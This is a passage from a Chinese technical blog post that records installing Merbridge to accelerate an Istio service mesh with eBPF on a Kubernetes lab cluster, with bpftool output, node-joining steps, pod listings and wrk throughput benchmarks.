class="line">5.8.0-050800-generic</span><br></pre></td></tr></table></figure><h5 id="相关版本说明"><a href="#相关版本说明" class="headerlink" title="相关版本说明"></a>相关版本说明</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           20.10.12</span><br><span class="line">root@ubuntu:~# kubectl version</span><br><span class="line">Client Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:25:17Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">Server Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:19:12Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">root@ubuntu:~# lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 20.04 LTS</span><br><span class="line">Release:        20.04</span><br><span class="line">Codename:       focal</span><br><span class="line">root@ubuntu:~# uname -r</span><br><span class="line">5.8.0-050800-generic</span><br></pre></td></tr></table></figure><h5 id="yaml文件apply之前的ebpf数据"><a href="#yaml文件apply之前的ebpf数据" class="headerlink" title="yaml文件apply之前的ebpf数据"></a>yaml文件apply之前的ebpf数据</h5><p>列出系统中所有cgroup上的附加程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool cgroup tree</span><br><span class="line">CgroupPath</span><br><span class="line">ID       AttachType      AttachFlags     Name</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">    21       ingress</span><br><span class="line">    20       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">    19       ingress</span><br><span class="line">    18       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">    23       ingress</span><br><span class="line">    22       egress</span><br></pre></td></tr></table></figure><p>查看系统中已经加载的所有BPF程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool prog show</span><br><span class="line">18: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">19: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">20: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">21: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">22: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">23: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br></pre></td></tr></table></figure><h5 id="merbridge安装"><a href="#merbridge安装" class="headerlink" title="merbridge安装"></a>merbridge安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl apply -f https://raw.githubusercontent.com/merbridge/merbridge/main/deploy/all-in-one.yaml</span><br><span class="line">clusterrole.rbac.authorization.k8s.io/merbridge created</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/merbridge created</span><br><span class="line">serviceaccount/merbridge created</span><br><span class="line">daemonset.apps/merbridge created</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS     RESTARTS   AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-7plxw    1/1     Running    0          17h</span><br><span class="line">istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running    0          17h</span><br><span class="line">istiod-6c5cfd79db-4ww7r                 1/1     Running    0          17h</span><br><span class="line">merbridge-75rr6                         0/1     Init:0/1   0          2m57s</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS    RESTARTS   AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-7plxw    1/1     Running   0          19h</span><br><span class="line">istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running   0          19h</span><br><span class="line">istiod-6c5cfd79db-4ww7r                 1/1     Running   0          19h</span><br><span class="line">merbridge-75rr6                        1/1     Running   0          12m</span><br></pre></td></tr></table></figure><p>再次查看系统中所有 cgroup 上的附加程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool cgroup tree</span><br><span class="line">CgroupPath</span><br><span class="line">ID       AttachType      AttachFlags     Name</span><br><span class="line">/sys/fs/cgroup/unified</span><br><span class="line">31       sock_ops                        mb_sockops</span><br><span class="line">43       bind4                           mb_bind</span><br><span class="line">27       connect4                        mb_sock4_connec</span><br><span class="line">35       getsockopt                      mb_get_sockopt</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">    21       ingress</span><br><span class="line">    20       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">    19       ingress</span><br><span class="line">    18       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">    23       ingress</span><br><span class="line">    22       egress</span><br></pre></td></tr></table></figure><p>再次查看系统中已经加载的所有 BPF 程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool prog show</span><br><span class="line">18: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">19: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">20: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">21: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">22: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">23: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">27: cgroup_sock_addr  name mb_sock4_connec  tag 52444be6f9070ca0  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 2336B  jited 1329B  memlock 4096B  map_ids 1,2,3,7</span><br><span class="line">        btf_id 3</span><br><span class="line">31: sock_ops  name mb_sockops  tag 92e9974a3364b015  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 1272B  jited 704B  memlock 4096B  map_ids 1,3,8,9</span><br><span class="line">        btf_id 6</span><br><span class="line">35: cgroup_sockopt  name mb_get_sockopt  tag d2a89e73318e6dc2  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 864B  jited 509B  memlock 4096B  map_ids 8</span><br><span class="line">        btf_id 9</span><br><span class="line">39: sk_msg  name mb_msg_redir  tag 95e99118f09830d0  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 376B  jited 237B  memlock 4096B  map_ids 9</span><br><span class="line">        btf_id 12</span><br><span class="line">43: cgroup_sock_addr  name mb_bind  tag 57cd311f2e27366b  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 16B  jited 40B  memlock 4096B</span><br><span class="line">        btf_id 15</span><br></pre></td></tr></table></figure><p>发现ebpf程序已经成功加载进内核</p><h5 id="确认ebpf程序生效"><a href="#确认ebpf程序生效" class="headerlink" title="确认ebpf程序生效"></a>确认ebpf程序生效</h5><p>yaml文件开启<code>debug</code>模式</p><p>打开日志追踪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /sys/kernel/debug/tracing/tracing_on</span><br></pre></td></tr></table></figure><p>再次访问<code>192.168.19.84:31356/productpage</code></p><p>使用<code>cat /sys/kernel/debug/tracing/trace_pipe</code>查看输出</p><p><img src="/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/1.png" alt="1"></p><h5 id="tps测试如下"><a href="#tps测试如下" class="headerlink" title="tps测试如下"></a>tps测试如下</h5><p>其中85是没有部署merbridge的，即没有通过ebpf加速。84是经过ebpf加速的，可以看到经过ebpf加速之后tps增加了一倍。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/wrk-master# ./wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.19s   402.47ms   1.96s    77.78%</span><br><span class="line">    Req/Sec    14.47     12.03    50.00     78.95%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.21s</span><br><span class="line">     75%    1.34s</span><br><span class="line">     90%    1.77s</span><br><span class="line">     99%    1.96s</span><br><span class="line">  111 requests in 10.04s, 544.62KB read</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/wrk-master# ./wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.52s   367.79ms   1.98s    80.85%</span><br><span class="line">    Req/Sec    17.94     18.18   140.00     89.08%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.61s</span><br><span class="line">     75%    1.72s</span><br><span class="line">     90%    1.85s</span><br><span class="line">     99%    1.98s</span><br><span class="line">  243 requests in 10.02s, 1.17MB read</span><br></pre></td></tr></table></figure><h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><p>集群测试分为两组</p><ul><li>没有经过merbridge加速：<code>192.168.19.85和192.168.19.83</code></li><li>经过merbridge加速：<code>192.168.19.84和192.168.19.82</code></li></ul><p>master节点分别是<code>192.168.19.85和192.168.19.84</code></p><h5 id="slave节点配置"><a href="#slave节点配置" class="headerlink" title="slave节点配置"></a>slave节点配置</h5><p>1.安装docker和k8s工具，这里不再赘述</p><p>2.将从节点加入主节点</p><p>主节点查看令牌，没有则需要创建令牌</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubeadm token list</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubeadm token create</span><br></pre></td></tr></table></figure><p>如果没有 <code>--discovery-token-ca-cert-hash</code> 的值，则可以通过在控制平面节点上执行以下命令来获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt;/dev/null | \</span></span><br><span class="line">   openssl dgst -sha256 -hex | sed <span class="string">'s/^.* //'</span></span><br></pre></td></tr></table></figure><p>3.从节点执行<code>kubeadm join</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu1:/etc/kubernetes# swapoff -a</span><br><span class="line">root@ubuntu1:/etc/kubernetes# kubeadm join --token 11sf7j.b46h7ej8l01pddgj 192.168.19.85:6443 --discovery-token-ca-cert-hash sha256:dde9c1d26f1d6178203ed03e6e3e0df6c0d926aa60fba0f0a4e2a88b47b95a69</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">[preflight] Reading configuration from the cluster...</span><br><span class="line">[preflight] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'</span><br><span class="line">W0222 09:41:45.561758    4675 utils.go:69] The recommended value for "resolvConf" in "KubeletConfiguration" is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file "/var/lib/kubelet/config.yaml"</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file "/var/lib/kubelet/kubeadm-flags.env"</span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...</span><br><span class="line"></span><br><span class="line">This node has joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run 'kubectl get nodes' on the control-plane to see this node join the cluster.</span><br></pre></td></tr></table></figure><p>4.主节点查看nodes情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/etc/kubernetes# kubectl get nodes</span><br><span class="line">NAME      STATUS   ROLES                  AGE     VERSION</span><br><span class="line">ubuntu    Ready    control-plane,master   12d     v1.23.3</span><br><span class="line">ubuntu1   Ready    &lt;none&gt;                 2m46s   v1.23.4</span><br></pre></td></tr></table></figure><p>5.查看pod的分布情况</p><p>192.168.19.85</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod --all-namespaces -o wide</span><br><span class="line">NAMESPACE      NAME                                    READY   STATUS    RESTARTS       AGE   IP              NODE      NOMINATED NODE   READINESS GATES</span><br><span class="line">default        details-v1-5498c86cf5-bhv2h             2/2     Running   26 (40h ago)   12d   10.244.0.175    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v1-fdb8c8c58-gh4sf           2/2     Running   0              39h   10.244.1.4      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v2-5b46bc9f84-glxpg          2/2     Running   0              39h   10.244.1.3      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        productpage-v1-65b75f6885-p6k2w         2/2     Running   26 (40h ago)   12d   10.244.0.171    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        ratings-v1-b477cf6cf-k84kr              2/2     Running   26 (40h ago)   12d   10.244.0.179    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v1-79d546878f-q6f62             2/2     Running   26 (40h ago)   12d   10.244.0.168    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v2-548c57f459-cqq2r             2/2     Running   26 (40h ago)   12d   10.244.0.180    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v3-6dd79655b9-gr42h             2/2     Running   26 (40h ago)   12d   10.244.0.173    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        sleep-698cfc4445-k8ncb                  2/2     Running   0              39h   10.244.1.2      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-egressgateway-79bb75fcf9-z6pqt    1/1     Running   13 (40h ago)   12d   10.244.0.178    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-ingressgateway-84bfcfd895-cdkwd   1/1     Running   13 (40h ago)   12d   10.244.0.176    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istiod-6c5cfd79db-8nqqb                 1/1     Running   14 (40h ago)   12d   10.244.0.174    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-8xrmh                 1/1     Running   15 (40h ago)   13d   10.244.0.169    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-cv77n                 1/1     Running   14 (40h ago)   13d   10.244.0.181    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    etcd-ubuntu                             1/1     Running   16 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-apiserver-ubuntu                   1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-controller-manager-ubuntu          1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-87xdz                   1/1     Running   18 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-drk55                   1/1     Running   0              40h   192.168.19.83   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-9rwc5                        1/1     Running   0              40h   192.168.19.83   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-qkcxz                        1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-scheduler-ubuntu                   1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure><p>192.168.19.84</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod --all-namespaces -o wide</span><br><span class="line">NAMESPACE      NAME                                    READY   STATUS    RESTARTS      AGE     IP              NODE      NOMINATED NODE   READINESS GATES</span><br><span class="line">default        details-v1-5498c86cf5-7qwql             2/2     Running   2 (23h ago)   6d16h   10.244.0.34     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v1-fdb8c8c58-28pm4           2/2     Running   0             22h     10.244.1.5      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v2-5b46bc9f84-rs5ch          2/2     Running   0             22h     10.244.1.6      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        productpage-v1-65b75f6885-kt88j         2/2     Running   2 (23h ago)   6d16h   10.244.0.31     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        ratings-v1-b477cf6cf-8bdk9              2/2     Running   2 (23h ago)   6d16h   10.244.0.35     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v1-79d546878f-nf4xd             2/2     Running   2 (23h ago)   6d16h   10.244.0.25     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v2-548c57f459-sdjzs             2/2     Running   2 (23h ago)   6d16h   10.244.0.24     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v3-6dd79655b9-p6vdg             2/2     Running   2 (23h ago)   6d16h   10.244.0.26     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        sleep-698cfc4445-qncjl                  2/2     Running   0             22h     10.244.1.4      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-egressgateway-79bb75fcf9-7plxw    1/1     Running   1 (23h ago)   6d17h   10.244.0.29     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running   1 (23h ago)   6d17h   10.244.0.32     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istiod-6c5cfd79db-4ww7r                 1/1     Running   1 (23h ago)   6d17h   10.244.0.23     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   merbridge-9kmsk                         1/1     Running   1 (23h ago)   5d21h   10.244.0.28     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   merbridge-jqt9x                         1/1     Running   7 (23h ago)   23h     10.244.1.3      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-87slm                 1/1     Running   1 (23h ago)   6d17h   10.244.0.36     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-ld7cp                 1/1     Running   1 (23h ago)   6d17h   10.244.0.33     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    etcd-ubuntu                             1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-apiserver-ubuntu                   1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-controller-manager-ubuntu          1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-7lvxj                   1/1     Running   1 (23h ago)   23h     192.168.19.82   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-fqtst                   1/1     Running   1 (23h ago)   6d16h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-9kwsc                        1/1     Running   1 (23h ago)   23h     192.168.19.82   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-p8nw9                        1/1     Running   1 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-scheduler-ubuntu                   1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure><h5 id="外部向pod发送请求"><a href="#外部向pod发送请求" class="headerlink" title="外部向pod发送请求"></a>外部向pod发送请求</h5><h6 id="集群内"><a href="#集群内" class="headerlink" title="集群内"></a>集群内</h6><p>在node为<code>192.168.19.85</code>的机器上向node为<code>192.168.19.83</code>机器上的pod发送请求(没有merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.83:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.83:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.62s   294.11ms   1.97s    66.67%</span><br><span class="line">    Req/Sec     9.85      8.67    50.00     78.87%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.73s</span><br><span class="line">     75%    1.85s</span><br><span class="line">     90%    1.97s</span><br><span class="line">     99%    1.97s</span><br><span class="line">  108 requests in 10.07s, 530.88KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 99</span><br><span class="line">Requests/sec:     10.72</span><br><span class="line">Transfer/sec:     